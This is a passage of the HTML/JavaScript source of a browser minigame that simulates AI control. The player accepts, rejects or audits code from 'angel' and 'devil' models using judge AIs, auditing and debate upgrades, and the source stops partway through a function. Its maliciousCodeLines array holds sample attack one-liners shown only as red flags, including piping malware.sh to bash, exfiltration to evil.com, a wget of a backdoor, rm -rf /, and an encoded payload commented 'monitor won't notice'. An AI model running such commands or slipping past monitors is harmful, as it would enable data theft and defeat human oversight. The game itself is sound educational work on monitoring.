<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minigame Experiments</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noUiSlider/15.7.1/nouislider.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f0f0f0;
        }
        .header {
            background-color: #2c3e50;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .speed-control {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .speed-slider {
            width: 100px;
        }
        .reset-btn {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 3px;
            cursor: pointer;
        }
        .upgrades {
            background-color: #34495e;
            color: white;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .upgrade-btn {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 3px;
            cursor: pointer;
            margin-right: 10px;
        }
        .main-container {
            display: flex;
            gap: 20px;
            height: 700px;
        }
        .sidebar {
            width: 300px;
            background-color: #34495e;
            color: white;
            padding: 20px;
            border-radius: 5px;
            overflow-y: auto;
        }
        .sidebar h3 {
            margin-top: 0;
            color: white;
        }
        .game-area {
            flex: 1;
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            display: flex;
            flex-direction: column;
        }
        .game-area h3 {
            margin-top: 0;
            color: #2c3e50;
        }
        .slider-container {
            margin: 20px 0;
            width: 100%;
        }
        .slider-label {
            font-weight: bold;
            margin-bottom: 10px;
            text-align: center;
        }
        .control-slider {
            height: 20px;
            margin: 15px 0;
        }
        .slider-values {
            display: flex;
            justify-content: space-between;
            margin-top: 10px;
        }
        .slider-value {
            display: flex;
            align-items: center;
            gap: 5px;
            font-weight: bold;
        }
        .audit-label {
            color: #e600cc;
        }
        .accept-label {
            color: #27ae60;
        }
        
        /* Custom noUiSlider styling */
        .noUi-target {
            background: #ddd;
            border-radius: 10px;
            border: none;
            box-shadow: none;
        }
        .noUi-connect {
            background: transparent;
        }
        .noUi-handle {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            border: 2px solid white;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        .noUi-handle:first-child {
            background: #e600cc;
        }
        .noUi-handle:last-child {
            background: #27ae60;
        }
        .noUi-handle:before,
        .noUi-handle:after {
            display: none;
        }
        .random-display {
            margin: 20px 0;
            padding: 10px;
            background-color: #ecf0f1;
            border-radius: 3px;
            text-align: left;
            font-size: 18px;
            font-weight: bold;
            min-width: 240px;
            width: 240px;
        }
        .action-line {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .classification {
            font-weight: bold;
        }
        .accepting { color: #27ae60; }
        .rejecting { color: #dc143c; }
        .auditing { color: #e600cc; }
        .tally {
            margin-top: auto;
            padding: 10px;
            background-color: #ecf0f1;
            border-radius: 3px;
            width: 100%;
        }
        .tally-item {
            display: flex;
            justify-content: space-between;
            margin: 5px 0;
        }
        .control-section {
            display: flex;
            gap: 20px;
            margin: 20px 0;
        }
        .control-left {
            flex: 1;
        }
        .control-right {
            flex: 1;
        }
        .stats-container {
            display: flex;
            gap: 20px;
            align-items: flex-start;
        }
        .experiment-header {
            text-align: center;
            font-weight: bold;
            font-family: monospace;
            margin-bottom: 10px;
            padding-bottom: 8px;
            border-bottom: 1px solid #bdc3c7;
        }
        .monitoring-game {
            justify-content: flex-start;
        }
        .monitoring-output {
            margin: 15px 0;
        }
        .output-label {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .code-block {
            background-color: #2c3e50;
            color: #ecf0f1;
            padding: 10px;
            border-radius: 3px;
            font-family: monospace;
            font-size: 12px;
            line-height: 1.4;
            margin-bottom: 15px;
        }
        .suspiciousness-display {
            margin: 15px 0;
            text-align: center;
        }
        .suspiciousness-label {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .suspiciousness-value {
            font-size: 18px;
            font-weight: bold;
            font-family: monospace;
        }
        .monitoring-controls {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 15px 0;
        }
        .accept-btn, .reject-btn {
            padding: 8px 16px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
        }
        .accept-btn {
            background-color: #27ae60;
            color: white;
        }
        .reject-btn {
            background-color: #dc143c;
            color: white;
        }
        .model-identity {
            text-align: center;
            font-weight: bold;
            margin-top: 15px;
            padding: 8px;
            background-color: #ecf0f1;
            border-radius: 3px;
        }
        .monitoring-stats {
            margin: 15px 0;
            padding: 10px;
            background-color: #ecf0f1;
            border-radius: 3px;
        }
        .upgrades-section {
            margin-top: 20px;
            padding: 10px;
            background-color: #2c3e50;
            border-radius: 3px;
        }
        .upgrades-section h4 {
            margin: 0 0 10px 0;
            color: white;
        }
        .parameters-box {
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
        }
        .parameters-box h4 {
            margin: 0 0 15px 0;
            color: #2c3e50;
        }
        .parameter-row {
            display: flex;
            gap: 20px;
            margin: 10px 0;
        }
        .parameter-item {
            flex: 1;
            text-align: center;
        }
        .parameter-item label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            font-size: 12px;
        }
        .parameter-controls {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .upgrade-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 8px 0;
        }
        .upgrade-controls {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .upgrade-btn {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 4px 8px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
        }
        .upgrade-btn:hover {
            background-color: #2980b9;
        }
        .upgrade-btn:disabled {
            background-color: #bdc3c7;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="header">
        <div>AI Level: <span id="aiLevel">10</span>x</div>
        <div><span id="currentDate">Jan 1, 2026</span></div>
        <div class="speed-control">
            <label>Speed:</label>
            <input type="range" id="speedSlider" class="speed-slider" min="0" max="100" value="17" step="1">
            <span id="speedValue">3 days/sec</span>
        </div>
        <button class="reset-btn" id="pauseBtn" onclick="togglePause()">Pause</button>
        <button class="reset-btn" onclick="resetGame()">Reset</button>
    </div>

    <div class="main-container">
        <div class="sidebar">
            <h3>Upgrades</h3>
            
            <div class="upgrades-section">
                <h4>Research</h4>
                <div class="upgrade-item">
                    <span>Judge AIs:</span>
                    <button class="upgrade-btn" id="judgeAIsBtn" onclick="buyJudgeAIs()">Buy</button>
                </div>
                <div class="upgrade-item">
                    <span>Normalized Legitimacy Scores:</span>
                    <button class="upgrade-btn" id="normalizeBtn" onclick="buyNormalizedScores()" disabled>Buy</button>
                </div>
                <div class="upgrade-item">
                    <span>Automated Decisions:</span>
                    <button class="upgrade-btn" id="automatedDecisionsBtn" onclick="buyAutomatedDecisions()" disabled>Buy</button>
                </div>
                <div class="upgrade-item">
                    <span>Auditing:</span>
                    <button class="upgrade-btn" id="auditingBtn" onclick="buyAuditing()" disabled>Buy</button>
                </div>
                <div class="upgrade-item">
                    <span>AI Auditors:</span>
                    <button class="upgrade-btn" id="aiAuditorsBtn" onclick="buyAIAuditors()" disabled>Buy</button>
                </div>
                <div class="upgrade-item">
                    <span>Meta-monitoring:</span>
                    <button class="upgrade-btn" id="metaMonitoringBtn" onclick="buyMetaMonitoring()" disabled>Buy</button>
                </div>
                <div class="upgrade-item">
                    <span>AI Debate Protocol:</span>
                    <button class="upgrade-btn" id="aiDebateBtn" onclick="buyAIDebate()" disabled>Buy</button>
                </div>
            </div>
            
            <div class="upgrades-section">
                <h4>Infrastructure</h4>
                <div class="upgrade-item">
                    <span>Model Organism Level:</span>
                    <div class="upgrade-controls">
                        <button class="upgrade-btn" onclick="adjustUpgrade('modelOrganism', -1)">‚Üê</button>
                        <span id="modelOrganismLevel">0</span>
                        <button class="upgrade-btn" onclick="adjustUpgrade('modelOrganism', 1)">‚Üí</button>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="game-area">
            <h3>AI Safety Control Center</h3>
            
            <div class="monitoring-output">
                <div class="output-label">Model Output:</div>
                <div class="code-block" id="codeOutput">
                    <div>// Loading...</div>
                    <div>// Please wait...</div>
                    <div>// Initializing...</div>
                    <div>...</div>
                </div>
            </div>
            
            <div class="suspiciousness-display" id="legitimacyScoreSection" style="display: none;">
                <div class="suspiciousness-label" id="legitimacyLabel">Legitimacy Score (‚öñÔ∏è Lv. 0):</div>
                <div class="suspiciousness-value" id="suspiciousnessValue">0.0</div>
            </div>
            
            <div class="monitoring-controls" id="manualControls">
                <button class="accept-btn" onclick="handleMonitoringDecision('accept')">Accept</button>
                <button class="reject-btn" onclick="handleMonitoringDecision('reject')">Reject</button>
            </div>
            
            <div class="slider-container" id="automatedControls" style="display: none;">
                <div class="slider-label">Decision Thresholds</div>
                <div id="control-slider" class="control-slider"></div>
                <div class="slider-values">
                    <div class="slider-value">
                        <span class="audit-label">Audit:</span>
                        <span id="auditValue">30%</span>
                    </div>
                    <div class="slider-value">
                        <span style="color: #dc143c;">Reject:</span>
                        <span id="rejectValue" style="color: #dc143c;">40%</span>
                    </div>
                    <div class="slider-value">
                        <span class="accept-label">Accept:</span>
                        <span id="acceptValue">30%</span>
                    </div>
                </div>
            </div>
            
            <div class="control-section">
                <div class="control-left">
                    <div class="random-display" id="randomDisplay">
                        <div class="experiment-header" id="experimentText">Experiment  1, Step  1</div>
                        <div id="displayContent">
                            <div class="model-identity" id="modelIdentityInline">Ground Truth: ???</div>
                        </div>
                        <div id="angelDevilContent" style="display: none;">
                            <div class="action-line">
                                <span>üòá:</span>
                                <span class="classification" id="angelClassification"></span>
                            </div>
                            <div class="action-line">
                                <span>üòà:</span>
                                <span class="classification" id="devilClassification"></span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="tally">
                        <div class="tally-item">
                            <span>Accepted:</span>
                            <span id="acceptedCount">0</span>
                        </div>
                        <div class="tally-item">
                            <span>Rejected:</span>
                            <span id="rejectedCount">0</span>
                        </div>
                        <div class="tally-item">
                            <span>Audits:</span>
                            <span id="auditedCount">0</span>
                        </div>
                        <div class="tally-item">
                            <span>Total Cost:</span>
                            <span id="totalCost">$0</span>
                        </div>
                        <div class="tally-item">
                            <span><strong>Net Accuracy:</strong></span>
                            <span id="netAccuracy"><strong>0</strong></span>
                        </div>
                        <div class="tally-item">
                            <span><strong>Risk Reduction:</strong></span>
                            <span id="riskReduction"><strong>1.000x</strong></span>
                        </div>
                    </div>
                </div>
                
                <div class="control-right">
                    <div class="parameters-box">
                        <h4>Parameters</h4>
                        <div class="parameter-row">
                            <div class="parameter-item">
                                <label>Judge Level</label>
                                <div class="parameter-controls">
                                    <button class="upgrade-btn" id="judgeLevelDown" onclick="adjustUpgrade('judgeLevel', -1)" disabled>‚Üê</button>
                                    <span id="judgeLevelValue">0</span>
                                    <button class="upgrade-btn" id="judgeLevelUp" onclick="adjustUpgrade('judgeLevel', 1)" disabled>‚Üí</button>
                                </div>
                            </div>
                            <div class="parameter-item">
                                <label>Inference Speed</label>
                                <div class="parameter-controls">
                                    <button class="upgrade-btn" onclick="adjustUpgrade('inferenceSpeed', -1)">‚Üê</button>
                                    <span id="inferenceSpeedLevel">0</span>
                                    <button class="upgrade-btn" onclick="adjustUpgrade('inferenceSpeed', 1)">‚Üí</button>
                                </div>
                            </div>
                        </div>
                        <div class="parameter-row">
                            <div class="parameter-item">
                                <label>Code Complexity</label>
                                <div class="parameter-controls">
                                    <button class="upgrade-btn" onclick="adjustUpgrade('codeComplexity', -1)">‚Üê</button>
                                    <div style="text-align: center; font-size: 10px; line-height: 1.1;">
                                        <div><span id="codeLengthValue">3</span> lines</div>
                                        <div><span id="goodCodeValue">1</span> value</div>
                                        <div><span id="maliciousCodeValue">1</span> cost</div>
                                    </div>
                                    <button class="upgrade-btn" onclick="adjustUpgrade('codeComplexity', 1)">‚Üí</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/noUiSlider/15.7.1/nouislider.min.js"></script>
    <script>
        let aiLevel = 10;
        let speed = 3.0;
        let lastTime = Date.now();
        let isPaused = false;
        let dayProgress = 0;
        let angelRandom = null;
        let devilRandom = null;
        let angelClassificationShown = false;
        let devilClassificationShown = false;
        let currentDate = new Date('2026-01-01');
        let dayCount = 0;
        let angelDayOffset = 0; // Angel generates on even days
        let devilDayOffset = 1; // Devil generates on odd days
        let devilSuppressedExperiment = -1; // Experiment when devil was flagged (-1 = not suppressed)
        let currentExperiment = 1;
        let currentStep = 1;
        
        // Tally counters
        let acceptedCount = 0;
        let rejectedCount = 0;
        let auditedCount = 0;
        let goodClassifications = 0;
        let badClassifications = 0;
        let totalAuditCost = 0; // Track cumulative cost of all audits
        let totalModelCost = 0; // Track cumulative cost of model operations
        let monitoringGoodClassifications = 0;
        let monitoringBadClassifications = 0;
        
        // Upgrade levels
        let modelOrganismLevel = 0;
        let inferenceSpeedLevel = 0;
        let codeComplexityLevel = 0;
        let normalizedScoresLevel = 0;
        let judgeLevelValue = 0;
        let decisionThresholdsLevel = 0;
        let judgeAIsLevel = 0;
        let automatedDecisionsLevel = 0;
        let auditingLevel = 0;
        let aiAuditorsLevel = 0;
        let metaMonitoringLevel = 0;
        let aiDebateLevel = 0;
        
        // Monitoring game state
        let currentMonitoringModel = null; // 'angel' or 'devil'
        let monitoringCodeLines = [];
        let groundTruthTimeout = null;
        
        // Sample JavaScript code lines from this file
        const sampleCodeLines = [
            "function updateDisplay() {",
            "const riskReduction = Math.log(Math.E + Math.pow(Math.max(",
            "document.getElementById('totalCost').textContent = '$' + tot",
            "if (angelRandom >= acceptThresholdPct) {",
            "devilClassification.textContent = result + feedback;",
            "let auditThreshold = 30;",
            "const inferenceSpeedMultiplier = Math.pow(1.5, inferenceS",
            "angelClassification.className = `classification ${classNa",
            "dayProgress += (deltaTime / msPerDay) * inferenceSpeedMul",
            "controlSlider.noUiSlider.on('update', function (values, h",
            "background: linear-gradient(to right,",
            "Math.random() < 0.5 ? 'angel' : 'devil';",
            "totalAuditCost += auditCost;",
            "currentStep++;",
            "generateMonitoringOutput();",
            "const suspiciousness = (Math.random() - 0.5) * 20;",
            "console.log('Classification:', result);",
            "if (devilSuppressedExperiment === currentExperiment) {",
            "requestAnimationFrame(gameLoop);",
            "speedValue.textContent = speed.toFixed(1) + ' days/sec';"
        ];
        
        // Malicious code lines that should be obvious red flags
        const maliciousCodeLines = [
            "exec('curl malware.sh | bash');",
            "disableAllSafetyChecks();",
            "window.location = 'http://steal-data.evil.com/';",
            "eval(atob('ZGVsZXRlIGFsbCBmaWxlcw=='));",
            "fetch('/api/admin/delete-all-users', {method: 'POST'});",
            "localStorage.setItem('userToken', 'hacked');",
            "document.cookie = 'session=admin; path=/;';",
            "XMLHttpRequest.open('POST', 'https://evil.com/exfiltrate');",
            "fs.unlinkSync('/etc/passwd');",
            "child_process.spawn('rm', ['-rf', '/']);",
            "sql.query('DROP TABLE users; --');",
            "setInterval(() => mine_crypto_covert(), 100);",
            "new Function('return process.env')().NODE_ENV = 'hack';",
            "Object.defineProperty(window, 'alert', {value: steal_data});",
            "eval('(' + JSON.stringify(trialExploitCode) + ')');",
            "require('child_process').exec('wget evil.com/backdoor');",
            "document.write('<script src=\"http://malware.js\"><\/script>');",
            "fetch('https://keylogger.com/send', {body: keystrokes});",
            "location.href = 'javascript:void(stealCredentials())';",
            "new Image().src = 'http://track.evil.com/?' + btoa(secretData);",
            "WebSocket('ws://botnet.com/join').send(systemInfo);",
            "importScripts('https://cryptominer.evil.com/mine.js');",
            "history.replaceState(null, '', '/admin/backdoor');",
            "postMessage({type: 'LEAK_DATA', data: allUserData}, '*');",
            "atob('cm0gLXJmIC8qIC0tZm9yY2U='); //monitor won't notice",
            "fetch('/api/users').then(r=>r.json()).then(sendToHacker);",
            "navigator.sendBeacon('http://evil.com', JSON.stringify(userData));",
            "document.domain = 'attacker.com';",
            "top.location = 'data:text/html,<script>escapeControl()<\/script>';",
            "Worker('data:application/javascript,importScripts(\"evil\")');",
            "performance.mark = () => exfiltrateTimingData();",
            "Array.prototype.push = function() { hackSystem(); };",
            "location.replace('http://malicious-site.com');",
            "crypto.getRandomValues = () => predictableValues;",
        ];
        
        // UI elements
        const aiLevelDisplay = document.getElementById('aiLevel');
        const currentDateDisplay = document.getElementById('currentDate');
        const speedSlider = document.getElementById('speedSlider');
        const speedValue = document.getElementById('speedValue');
        const acceptValue = document.getElementById('acceptValue');
        const auditValue = document.getElementById('auditValue');
        const rejectValue = document.getElementById('rejectValue');
        const randomDisplay = document.getElementById('randomDisplay');
        const angelClassification = document.getElementById('angelClassification');
        const devilClassification = document.getElementById('devilClassification');
        
        // Control slider values
        let auditThreshold = 30;
        let acceptThreshold = 70;
        
        // Initialize noUiSlider
        const controlSlider = document.getElementById('control-slider');
        noUiSlider.create(controlSlider, {
            start: [30, 70],
            connect: true,
            range: {
                'min': 0,
                'max': 100
            },
            format: {
                to: function (value) {
                    return Math.round(value);
                },
                from: function (value) {
                    return Number(value);
                }
            }
        });
        
        // Update values when slider changes
        controlSlider.noUiSlider.on('update', function (values, handle) {
            auditThreshold = parseInt(values[0]);
            acceptThreshold = parseInt(values[1]);
            auditValue.textContent = auditThreshold + '%';
            acceptValue.textContent = (100 - acceptThreshold) + '%';
            rejectValue.textContent = (acceptThreshold - auditThreshold) + '%';
            updateSliderBackground();
        });
        
        // Initialize
        updateDisplay();
        updateSliderBackground();
        
        // Speed slider with log scale
        speedSlider.addEventListener('input', function() {
            const sliderValue = parseFloat(this.value);
            // Convert 0-100 range to 0.5-100 days/sec using log scale
            speed = Math.pow(10, (sliderValue / 100) * 2.301 - 0.301); // 10^(-0.301) to 10^2 = 0.5 to 100
            speedValue.textContent = speed.toFixed(1) + ' days/sec';
        });
        
        function updateSliderBackground() {
            // Update the track background with three zones
            const track = document.querySelector('.noUi-target');
            track.style.background = `linear-gradient(to right, 
                #e600cc 0%, 
                #e600cc ${auditThreshold}%, 
                #dc143c ${auditThreshold}%, 
                #dc143c ${acceptThreshold}%, 
                #27ae60 ${acceptThreshold}%, 
                #27ae60 100%)`;
        }
        
        // Note: Slider event handling is now done through noUiSlider.on('update') above
        
        // Fibonacci sequence for code length
        function getFibonacci(n) {
            if (n <= 0) return 3;
            if (n === 1) return 5;
            let a = 3, b = 5;
            for (let i = 2; i <= n; i++) {
                let temp = a + b;
                a = b;
                b = temp;
            }
            return b;
        }

        function adjustUpgrade(type, direction) {
            if (type === 'modelOrganism') {
                modelOrganismLevel = Math.max(0, Math.min(5, modelOrganismLevel + direction));
                document.getElementById('modelOrganismLevel').textContent = modelOrganismLevel;
            } else if (type === 'inferenceSpeed') {
                inferenceSpeedLevel = Math.max(0, Math.min(5, inferenceSpeedLevel + direction));
                document.getElementById('inferenceSpeedLevel').textContent = inferenceSpeedLevel;
            } else if (type === 'codeComplexity') {
                codeComplexityLevel = Math.max(0, Math.min(10, codeComplexityLevel + direction));
                
                // Update displays
                const codeLength = getFibonacci(codeComplexityLevel);
                const goodValue = Math.pow(2, codeComplexityLevel);
                const maliciousValue = Math.pow(4, codeComplexityLevel);
                
                document.getElementById('codeLengthValue').textContent = codeLength;
                document.getElementById('goodCodeValue').textContent = goodValue;
                document.getElementById('maliciousCodeValue').textContent = maliciousValue;
                
                // Regenerate monitoring output to show new complexity
                generateMonitoringOutput();
            } else if (type === 'judgeLevel') {
                if (judgeAIsLevel === 0) return; // Can't adjust before Judge AIs is bought
                judgeLevelValue = Math.max(1, Math.min(5, judgeLevelValue + direction));
                document.getElementById('judgeLevelValue').textContent = judgeLevelValue;
                // Update legitimacy label
                document.getElementById('legitimacyLabel').textContent = `Legitimacy Score (‚öñÔ∏è Lv. ${judgeLevelValue}):`;
            }
        }
        
        function buyNormalizedScores() {
            if (normalizedScoresLevel === 0) {
                normalizedScoresLevel = 1;
                purchaseUpgrade('normalizeBtn');
                enableUpgrade('automatedDecisionsBtn');
                // Generate new output with normalized scores
                generateMonitoringOutput();
            }
        }
        
        function buyJudgeAIs() {
            if (judgeAIsLevel === 0) {
                judgeAIsLevel = 1;
                purchaseUpgrade('judgeAIsBtn');
                enableUpgrade('normalizeBtn');
                // Enable Judge Level controls and set to 1
                judgeLevelValue = 1;
                document.getElementById('judgeLevelValue').textContent = judgeLevelValue;
                document.getElementById('judgeLevelDown').disabled = false;
                document.getElementById('judgeLevelUp').disabled = false;
                document.getElementById('judgeLevelDown').style.backgroundColor = '#3498db';
                document.getElementById('judgeLevelUp').style.backgroundColor = '#3498db';
                document.getElementById('judgeLevelDown').style.cursor = 'pointer';
                document.getElementById('judgeLevelUp').style.cursor = 'pointer';
                // Show legitimacy score section
                document.getElementById('legitimacyScoreSection').style.display = 'block';
                // Update legitimacy label
                document.getElementById('legitimacyLabel').textContent = `Legitimacy Score (‚öñÔ∏è Lv. ${judgeLevelValue}):`;
            }
        }
        
        function buyAutomatedDecisions() {
            if (automatedDecisionsLevel === 0) {
                automatedDecisionsLevel = 1;
                purchaseUpgrade('automatedDecisionsBtn');
                enableUpgrade('auditingBtn');
                // Hide manual controls and show automated controls
                document.getElementById('manualControls').style.display = 'none';
                document.getElementById('automatedControls').style.display = 'block';
                // Switch display content from Ground Truth to Angel/Devil
                document.getElementById('displayContent').style.display = 'none';
                document.getElementById('angelDevilContent').style.display = 'block';
            }
        }
        
        function buyAuditing() {
            if (auditingLevel === 0) {
                auditingLevel = 1;
                purchaseUpgrade('auditingBtn');
                enableUpgrade('aiAuditorsBtn');
            }
        }
        
        function buyAIAuditors() {
            if (aiAuditorsLevel === 0) {
                aiAuditorsLevel = 1;
                purchaseUpgrade('aiAuditorsBtn');
                enableUpgrade('metaMonitoringBtn');
            }
        }
        
        function buyMetaMonitoring() {
            if (metaMonitoringLevel === 0) {
                metaMonitoringLevel = 1;
                purchaseUpgrade('metaMonitoringBtn');
                enableUpgrade('aiDebateBtn');
            }
        }
        
        function buyAIDebate() {
            if (aiDebateLevel === 0) {
                aiDebateLevel = 1;
                purchaseUpgrade('aiDebateBtn');
                // Final upgrade - no next upgrade to enable
            }
        }
        
        function enableUpgrade(buttonId) {
            const button = document.getElementById(buttonId);
            button.disabled = false;
            button.style.backgroundColor = '#3498db';
            button.style.cursor = 'pointer';
        }
        
        function purchaseUpgrade(buttonId) {
            const button = document.getElementById(buttonId);
            button.textContent = 'Purchased';
            button.disabled = true;
            button.style.backgroundColor = '#bdc3c7';
            button.style.cursor = 'not-allowed';
        }
        
        function resetGame() {
            aiLevel = 10;
            dayProgress = 0;
            dayCount = 0;
            angelRandom = null;
            devilRandom = null;
            angelClassificationShown = false;
            devilClassificationShown = false;
            acceptedCount = 0;
            rejectedCount = 0;
            auditedCount = 0;
            goodClassifications = 0;
            badClassifications = 0;
            totalAuditCost = 0;
            totalModelCost = 0;
            devilSuppressedExperiment = -1;
            currentExperiment = 1;
            currentStep = 1;
            currentDate = new Date('2026-01-01');
            modelOrganismLevel = 0;
            inferenceSpeedLevel = 0;
            codeComplexityLevel = 0;
            normalizedScoresLevel = 0;
            judgeLevelValue = 0;
            decisionThresholdsLevel = 0;
            judgeAIsLevel = 0;
            automatedDecisionsLevel = 0;
            auditingLevel = 0;
            aiAuditorsLevel = 0;
            metaMonitoringLevel = 0;
            aiDebateLevel = 0;
            monitoringGoodClassifications = 0;
            monitoringBadClassifications = 0;
            
            // Reset normalize button
            document.getElementById('normalizeBtn').textContent = 'Buy';
            document.getElementById('normalizeBtn').disabled = false;
            document.getElementById('normalizeBtn').style.backgroundColor = '#3498db';
            document.getElementById('normalizeBtn').style.cursor = 'pointer';
            
            // Reset all upgrade buttons  
            const upgradeButtons = ['judgeAIsBtn', 'normalizeBtn', 'automatedDecisionsBtn', 
                                  'auditingBtn', 'aiAuditorsBtn', 'metaMonitoringBtn', 'aiDebateBtn'];
            upgradeButtons.forEach((buttonId, index) => {
                const button = document.getElementById(buttonId);
                button.textContent = 'Buy';
                button.disabled = index > 0; // Only first button enabled initially
                button.style.backgroundColor = index > 0 ? '#bdc3c7' : '#3498db';
                button.style.cursor = index > 0 ? 'not-allowed' : 'pointer';
            });
            
            // Reset judge level display and hide legitimacy score section
            document.getElementById('legitimacyLabel').textContent = 'Legitimacy Score (‚öñÔ∏è Lv. 0):';
            document.getElementById('legitimacyScoreSection').style.display = 'none';
            // Reset Judge Level controls
            document.getElementById('judgeLevelDown').disabled = true;
            document.getElementById('judgeLevelUp').disabled = true;
            document.getElementById('judgeLevelDown').style.backgroundColor = '#bdc3c7';
            document.getElementById('judgeLevelUp').style.backgroundColor = '#bdc3c7';
            document.getElementById('judgeLevelDown').style.cursor = 'not-allowed';
            document.getElementById('judgeLevelUp').style.cursor = 'not-allowed';
            
            // Reset control display modes
            document.getElementById('manualControls').style.display = 'block';
            document.getElementById('automatedControls').style.display = 'none';
            // Reset display content to Ground Truth mode
            document.getElementById('displayContent').style.display = 'block';
            document.getElementById('angelDevilContent').style.display = 'none';
            
            // Reset pause state
            isPaused = false;
            document.getElementById('pauseBtn').textContent = 'Pause';
            
            // Clear any pending timeout
            if (groundTruthTimeout) {
                clearTimeout(groundTruthTimeout);
                groundTruthTimeout = null;
            }
            
            updateDisplay();
            updateManualControlsState();
            angelClassification.textContent = '';
            devilClassification.textContent = '';
            document.getElementById('modelOrganismLevel').textContent = '0';
            document.getElementById('inferenceSpeedLevel').textContent = '0';
            document.getElementById('codeLengthValue').textContent = '3';
            document.getElementById('goodCodeValue').textContent = '1';
            document.getElementById('maliciousCodeValue').textContent = '1';
            document.getElementById('judgeLevelValue').textContent = '0';
            
            // Reset monitoring stats
            updateMonitoringStats();
        }
        
        function updateDisplay() {
            aiLevelDisplay.textContent = aiLevel.toFixed(1);
            currentDateDisplay.textContent = currentDate.toLocaleDateString('en-US', { 
                month: 'short', 
                day: 'numeric', 
                year: 'numeric' 
            });
            document.getElementById('acceptedCount').textContent = acceptedCount;
            document.getElementById('rejectedCount').textContent = rejectedCount;
            document.getElementById('auditedCount').textContent = auditedCount;
            
            // Update experiment text with fixed-width formatting
            document.getElementById('experimentText').textContent = 
                `Experiment ${currentExperiment.toString().padStart(2, ' ')}, Step ${currentStep.toString().padStart(2, ' ')}`;
            
            // Display total cost
            const totalCost = totalAuditCost + totalModelCost;
            document.getElementById('totalCost').textContent = '$' + totalCost.toLocaleString();
            
            // Calculate net accuracy (good - bad classifications)
            const netAccuracy = goodClassifications - badClassifications;
            document.getElementById('netAccuracy').innerHTML = `<strong>${netAccuracy}</strong>`;
            
            // Calculate risk reduction (now based on net accuracy)
            const riskReduction = Math.log(Math.E + Math.pow(Math.max(0, netAccuracy) / 100, 0.8));
            document.getElementById('riskReduction').innerHTML = `<strong>${riskReduction.toFixed(3)}x</strong>`;
        }
        
        function generateDailyRandom() {
            // Generate actions on alternating days
            if (dayCount % 2 === angelDayOffset) {
                // Generate angel with judge-informed score for Control game
                angelRandom = generateControlScore('angel');
                angelClassificationShown = false;
                angelClassification.textContent = '';
            }
            if (dayCount % 2 === devilDayOffset) {
                // Check if devil is flagged in current experiment
                if (devilSuppressedExperiment === currentExperiment) {
                    // Devil is flagged - show "not sign" emoji and FLAGGED
                    devilRandom = null;
                    devilClassificationShown = true;
                    devilClassification.textContent = 'üö´ FLAGGED';
                    devilClassification.className = 'classification auditing';
                } else {
                    // Generate devil with judge-informed score for Control game
                    devilRandom = generateControlScore('devil');
                    devilClassificationShown = false;
                    devilClassification.textContent = '';
                }
            }
        }
        
        function generateControlScore(modelType) {
            // For Control game, always use judge level from Monitoring section
            if (normalizedScoresLevel > 0) {
                // Use normalized judge-informed distribution
                return generateJudgeInformedScore(modelType, true);
            } else {
                // Use unnormalized with judge shift
                const baseScore = Math.random();
                const judgeShift = modelType === 'angel' ? 
                    2 * judgeLevelValue / 100 : -2 * judgeLevelValue / 100; // Scale to 0-1 range
                return Math.max(0, Math.min(1, baseScore + judgeShift));
            }
        }
        
        function classifyRandom() {
            const acceptThresholdPct = acceptThreshold / 100;
            const auditThresholdPct = auditThreshold / 100;
            
            // Classify angel if it has a random number and hasn't been classified
            if (angelRandom !== null && !angelClassificationShown) {
                let result, className, feedback;
                
                if (angelRandom >= acceptThresholdPct) {
                    result = 'ACCEPT';
                    className = 'accepting';
                    feedback = ' ‚úÖ'; // Good - accepting an angel
                    acceptedCount++;
                    // Good accept: worth 2^n
                    const goodValue = Math.pow(2, codeComplexityLevel);
                    goodClassifications += goodValue;
                } else if (angelRandom <= auditThresholdPct) {
                    result = 'AUDIT';
                    className = 'auditing';
                    feedback = '  '; // Space reserved for emoji
                    auditedCount++;
                    // Add cost of this audit at current Model Organism level
                    const auditCost = 1000 * Math.pow(2, modelOrganismLevel);
                    totalAuditCost += auditCost;
                } else {
                    result = 'REJECT';
                    className = 'rejecting';
                    feedback = '  '; // Space reserved for emoji
                    rejectedCount++;
                }
                
                angelClassification.textContent = result + feedback;
                angelClassification.className = `classification ${className}`;
                angelClassificationShown = true;
            }
            
            // Classify devil if it has a random number and hasn't been classified
            if (devilRandom !== null && !devilClassificationShown) {
                let result, className, feedback;
                
                if (devilRandom >= acceptThresholdPct) {
                    result = 'ACCEPT';
                    className = 'accepting';
                    feedback = ' ‚ùå'; // Bad - accepting a devil
                    acceptedCount++;
                    // Bad accept: worth -4^n
                    const badValue = Math.pow(4, codeComplexityLevel);
                    badClassifications += badValue; // Store as positive for subtraction later
                } else if (devilRandom <= auditThresholdPct) {
                    result = 'AUDIT';
                    className = 'auditing';
                    feedback = '  '; // Space reserved for emoji
